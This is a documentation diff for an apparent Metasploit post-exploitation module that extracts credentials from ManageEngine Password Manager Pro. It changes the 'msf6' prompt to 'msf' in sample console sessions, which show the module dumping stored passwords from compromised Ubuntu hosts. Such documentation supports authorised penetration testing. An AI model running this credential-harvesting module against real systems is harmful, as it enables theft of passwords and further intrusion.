@@ -107,7 +107,7 @@ The PostgreSQL port. Default is 2345.
 ### Meterpreter session on Ubuntu 20.04.4 - PMP version 12.1.0 (build 12123)
 
 ```
-msf6 post(linux/gather/manageengine_password_manager_creds) > run verbose=true session=1
+msf post(linux/gather/manageengine_password_manager_creds) > run verbose=true session=1
 
 [*] Detecting installation path
 [*] Trying to detect path from the Password Manager service
@@ -132,7 +132,7 @@ Password Manager Pro Credentials
  Resource2      https://mysql.foomsf.com  web db password  webdb          123webpassW0Rd@
 
 [*] Post module execution completed
-msf6 post(linux/gather/manageengine_password_manager_creds) > creds
+msf post(linux/gather/manageengine_password_manager_creds) > creds
 Credentials
 ===========
 
@@ -148,7 +148,7 @@ host  origin           service  public         private                realm  pri
 ### Shell session on Ubuntu 20.04.4 - PMP version 12.1.0 (build 12123)
 
 ```
-msf6 post(linux/gather/manageengine_password_manager_creds) > run verbose=true session=2
+msf post(linux/gather/manageengine_password_manager_creds) > run verbose=true session=2
 
 [*] Detecting installation path
 [*] Trying to detect path from the Password Manager service
@@ -171,7 +171,7 @@ Password Manager Pro Credentials
  Resource2      https://mysql.foomsf.com  web db password  webdb          123webpassW0Rd@
 
 [*] Post module execution completed
-msf6 post(linux/gather/manageengine_password_manager_creds) > creds
+msf post(linux/gather/manageengine_password_manager_creds) > creds
 Credentials
 ===========
 
